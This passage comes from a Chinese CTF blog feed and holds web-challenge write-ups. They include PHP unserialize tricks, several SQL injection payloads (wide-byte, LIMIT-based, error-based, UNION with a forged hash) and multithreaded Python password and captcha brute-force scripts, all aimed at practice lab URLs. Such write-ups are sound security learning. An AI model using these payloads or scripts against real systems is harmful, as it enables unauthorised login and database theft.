class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var <span class="variable">$enter</span>;</span><br><span class="line">    var <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        <span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = unserialize(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$o</span>-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.<span class="variable">$o</span>-&gt;secret;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://blog.csdn.net/21aspnet/article/details/6908318" target="_blank" rel="noopener">序列化小科普</a><br>首先运行下面代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">class just4fun &#123;  </span><br><span class="line">    var <span class="variable">$enter</span>;  </span><br><span class="line">    var <span class="variable">$secret</span>;  </span><br><span class="line">    <span class="keyword">function</span> just4fun()  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="variable">$this</span>-&gt;enter=&amp;<span class="variable">$this</span>-&gt;secret;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">echo</span> serialize(new just4fun());  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>得到 <code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code><br>构造<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">？pass=O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(0);</span><br><span class="line">require <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> clean(<span class="variable">$str</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line"><span class="variable">$str</span>=stripslashes(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> htmlentities(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = @clean((string)<span class="variable">$_GET</span>[<span class="string">'username'</span>]);</span><br><span class="line"><span class="variable">$password</span> = @clean((string)<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">'SELECT * FROM users WHERE name=\'</span><span class="string">'.$username.'</span>\<span class="string">' AND pass=\'</span><span class="string">'.$password.'</span>\<span class="string">';'</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$result</span> || mysql_num_rows(<span class="variable">$result</span>) &lt; 1)&#123;</span><br><span class="line">die(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>构造 ？username=\&amp;password=or 1=1%23<br>后台的查询语句为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=<span class="string">'\'</span> AND pass=<span class="string">' or 1= 1#'</span>;</span><br></pre></td></tr></table></figure></p><h1 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h1><p>通过解密，知道有<code>1bc29b36f623ba82aaf6724fd3b16718.php</code>文件，访问，有提示说tip在我的脑袋，查看返回的头部请求，注意到tip:history of bash,百度可知其用法，访问<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</span><br></pre></td></tr></table></figure></p><p>得到flag的下载路径。</p><h1 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  <span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line">  <span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line">  <span class="variable">$query</span> = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='<span class="variable">$user</span>'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$query</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$query</span>[pw]))) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://wenku.baidu.com/view/3f3e03c84431b90d6c85c7fb.html" target="_blank" rel="noopener">解法</a><br>主要就是通过union 联合查询，将从数据库返回的值为空，自己构造数据库返回的值。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(2,32) = c81e728d9d4c2f636f067f89cc14862c</span><br></pre></td></tr></table></figure><p>用户名输入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos; and 1=0 UNION SELECT &quot;c81e728d9d4c2f636f067f89cc14862c&quot; #</span><br></pre></td></tr></table></figure></p><p>密码中输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure></p><h1 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h1><p>访问<br><code>http://cms.nuptzj.cn/about.php?file=say.php</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt;</span><br><span class="line">&amp;lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">$nice=$_POST[&apos;nice&apos;];</span><br><span class="line">$say=$_POST[&apos;usersay&apos;];</span><br><span class="line">if(!isset($_COOKIE[&apos;username&apos;]))&#123;</span><br><span class="line">setcookie(&apos;username&apos;,$nice);</span><br><span class="line">setcookie(&apos;userpass&apos;,&apos;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$_COOKIE[&apos;username&apos;];</span><br><span class="line">$userpass=$_COOKIE[&apos;userpass&apos;];</span><br><span class="line">if($nice==&amp;quot;&amp;quot; || $say==&amp;quot;&amp;quot;)&#123;</span><br><span class="line">echo &amp;quot;&amp;lt;script&amp;gt;alert(&apos;昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)&apos;);&amp;lt;/script&amp;gt;&amp;quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) or die(&amp;quot;不能连接到数据库！！&amp;quot;.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$nice=mysql_real_escape_string($nice);</span><br><span class="line">$username=mysql_real_escape_string($username);</span><br><span class="line">$userpass=mysql_real_escape_string($userpass);</span><br><span class="line">$result=mysql_query(&amp;quot;SELECT username FROM admin where username=&apos;$nice&apos;&amp;quot;,$con);</span><br><span class="line">$login=mysql_query(&amp;quot;SELECT * FROM admin where username=&apos;$username&apos; AND userpass=&apos;$userpass&apos;&amp;quot;,$con);</span><br><span class="line">if(mysql_num_rows($result)&amp;gt;0 &amp;amp;&amp;amp; mysql_num_rows($login)&amp;lt;=0)&#123;</span><br><span class="line">echo &amp;quot;&amp;lt;script&amp;gt;alert(&apos;昵称已被使用，请更换！&apos;);&amp;lt;/script&amp;gt;&amp;quot;;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_close($con);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">$say=mysql_real_escape_string($say);</span><br><span class="line">mysql_query(&amp;quot;insert into message (nice,say,display) values(&apos;$nice&apos;,&apos;$say&apos;,0)&amp;quot;,$con);</span><br><span class="line">mysql_close($con);</span><br><span class="line">echo &apos;&amp;lt;script&amp;gt;alert(&amp;quot;构建和谐社会，留言需要经过管理员审核才可以显示！&amp;quot;);window.location = &amp;quot;./index.php&amp;quot;&amp;lt;/script&amp;gt;&apos;;</span><br><span class="line">?&amp;gt;gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>网络信息安全攻防</title>
      <link href="/posts/53139f85.html"/>
      <url>/posts/53139f85.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>以前做的时候，挺多不会做的，这次卷土重来，重新刷一下！</p><a id="more"></a><h1 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h1><h2 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url=<span class="string">"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"</span></span><br><span class="line">session=requests.session()</span><br><span class="line">regular=r<span class="string">'[0-9+*()]+[)]'</span></span><br><span class="line">header=&#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=98f76f8684f350fd7c311decb810cdf8'</span>&#125;</span><br><span class="line">res=session.get(url,headers=header)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br><span class="line">chen=re.compile(regular)</span><br><span class="line">obj=chen.findall(res.content.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line">html=<span class="built_in">eval</span>(obj[0])</span><br><span class="line">data=&#123;<span class="string">'v'</span>:html&#125;</span><br><span class="line">r=session.post(url,data=data,headers=header)</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br></pre></td></tr></table></figure><h2 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h2><p>该验证码登入一次后，没有失效，再次登入用此验证码，还能生效。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">"http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">pwd</span> <span class="keyword">in</span> range(1000, 10000):</span><br><span class="line">    payload = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: <span class="built_in">pwd</span>, <span class="string">'vcode'</span>: <span class="string">'83HE'</span>&#125;</span><br><span class="line">    header=&#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=98f76f8684f350fd7c311decb810cdf8'</span>&#125;</span><br><span class="line">    r=s.post(url,data=payload,headers=header)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> r.content.decode(<span class="string">'utf-8'</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"正确的密码为:"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pwd</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.content)</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"正在尝试爆破"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure><h2 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests, re</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php'</span></span><br><span class="line">login = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">c = s.get(url).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">curTask = 1000</span><br><span class="line">maxTask = 10000</span><br><span class="line">flag = False</span><br><span class="line">right = <span class="string">''</span></span><br><span class="line">header = &#123;<span class="string">'Referer'</span>: <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php'</span>,</span><br><span class="line">          <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">          <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def thread():</span><br><span class="line">    global lock</span><br><span class="line">    global curTask</span><br><span class="line">    global maxTask</span><br><span class="line">    global flag</span><br><span class="line">    global right</span><br><span class="line">    global header</span><br><span class="line">    <span class="keyword">while</span> not flag:  <span class="comment"># 当flag为假也就是正确密码还没出来时，不断取任务来完成</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 取任务  #这个过程不能被打断</span></span><br><span class="line">        myTask = curTask</span><br><span class="line">        curTask = curTask + 1</span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="keyword">if</span> myTask &gt;= maxTask:  <span class="comment"># 所有任务已经完成就退出</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: str(myTask), <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">        c1 = s.post(login, data=data, headers=header).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="built_in">print</span>(str(myTask) + <span class="string">':'</span> + c1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> c1:</span><br><span class="line">            right = str(myTask) + <span class="string">', '</span> + c1</span><br><span class="line">            flag = True  <span class="comment"># 当密码正确时，flag为真</span></span><br><span class="line"><span class="comment"># 多线程执行</span></span><br><span class="line">threadNum = 50</span><br><span class="line">threadlist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(threadNum):</span><br><span class="line">    threadlist.append(threading.Thread(target=thread))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threadlist:</span><br><span class="line">    i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threadlist:</span><br><span class="line">    i.join()</span><br><span class="line"><span class="comment"># 最终输出正确结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'pwd is '</span> + right)</span><br></pre></td></tr></table></figure><h2 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h2><p>解法同上面</p><h2 id="微笑一下就能过关了"><a href="#微笑一下就能过关了" class="headerlink" title="微笑一下就能过关了"></a>微笑一下就能过关了</h2><p>查看源代码可得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'view-source'</span>])) &#123; </span><br><span class="line">        show_source(__FILE__); </span><br><span class="line">        <span class="built_in">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    include(<span class="string">'flag.php'</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$smile</span> = 1;  </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!isset (<span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/\./'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/%/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/[0-9]/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/http/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>]) ) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/https/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>]) ) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/ftp/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/telnet/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/_/'</span>, <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>])) <span class="variable">$smile</span> = 0; </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$smile</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (@file_exists (<span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$smile</span>) &#123; </span><br><span class="line">        <span class="variable">$smile</span> = @file_get_contents (<span class="variable">$_GET</span>[<span class="string">'^_^'</span>]);  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smile</span> === <span class="string">"(●'◡'●)"</span>) die(<span class="variable">$flag</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;!doctype html&gt; </span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt; </span><br><span class="line">&lt;title&gt;Show me your smile :)&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"style.css"</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line"></span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;div class=<span class="string">"loginform cf"</span>&gt; </span><br><span class="line">    &lt;form name=<span class="string">"login"</span> action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span> accept-charset=<span class="string">"utf-8"</span>&gt; </span><br><span class="line">        &lt;ul&gt; </span><br><span class="line">            &lt;li&gt; </span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">"SMILE"</span>&gt;请使用微笑过关&lt;a href=<span class="string">"?view-source"</span>&gt;源代码&lt;/a&gt;&lt;/label&gt; </span><br><span class="line">                &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"T_T"</span> placeholder=<span class="string">"where is your smile"</span> required&gt; </span><br><span class="line">            &lt;/li&gt; </span><br><span class="line">            &lt;li&gt;&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Show"</span>&gt; &lt;/li&gt; </span><br><span class="line">        &lt;/ul&gt; </span><br><span class="line">    &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;div style=<span class="string">"text-align:center;clear:both"</span>&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●<span class="string">'◡'</span>●)</span><br></pre></td></tr></table></figure><h2 id="注入关"><a href="#注入关" class="headerlink" title="注入关"></a>注入关</h2><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>输入%df’出现报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>判断字段长短<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' order by 3 %23</span></span><br></pre></td></tr></table></figure></p><p>得到显示位</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,3 %23</span></span><br></pre></td></tr></table></figure><p>显示位为 2,3</p><p>查看表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</span></span><br></pre></td></tr></table></figure></p><p>得到字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7361655f757365725f73716c6934) %23</span></span><br></pre></td></tr></table></figure></p><p>得到字段数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(title_1,content_1) from sae_user_sqli4) %23</span></span><br></pre></td></tr></table></figure></p><h2 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h2><p>猜测后台是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from  table <span class="built_in">limit</span> start,num</span><br></pre></td></tr></table></figure></p><p>发现只有limit参数有用，num没影响</p><p>遇到limit的注入的时候，可以使用如下的语句进行报错注入。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select field from user <span class="built_in">where</span> id=XXX order by id <span class="built_in">limit</span> 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,SQL注入语句)),1);</span><br></pre></td></tr></table></figure></p><p>得到表名article,user<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()))),1)%23%20&amp;num=100%20%23</span><br></pre></td></tr></table></figure></p><p>得到user表中的字段id,username,password,lastloginI<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x75736572))),1)%23%20&amp;num=100%20%23</span><br></pre></td></tr></table></figure></p><p>字段数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=6 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(username,password) from user))),1)%23</span><br><span class="line">&amp;num=100 %23</span><br></pre></td></tr></table></figure></p><h2 id="图片宽字节注入"><a href="#图片宽字节注入" class="headerlink" title="图片宽字节注入"></a>图片宽字节注入</h2><p>在页面上看不出显示的结果，要在burpsuite上查看<br>网上说是图片宽字节注入，一直抓不到图片的数据包，只好作罢</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><a href="http://blog.csdn.net/mvcandroid/article/details/73995898" target="_blank" rel="noopener">一些常见的报错注入</a><br>报错注入语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,(注入语句),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</span><br></pre></td></tr></table></figure></p><p>得到数据库名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p><p>得到表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php</span><br><span class="line">?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p><p>得到字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=0x6c6f67 limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p><p>得到表中有多少条数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select count(*) from motto),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p><p>脱裤失败<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php</span><br><span class="line">?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select username from motto limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p><p>尝试别的语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23</span></span><br></pre></td></tr></table></figure></p><h2 id="盲注"><a href="#盲注" class="headerlink" 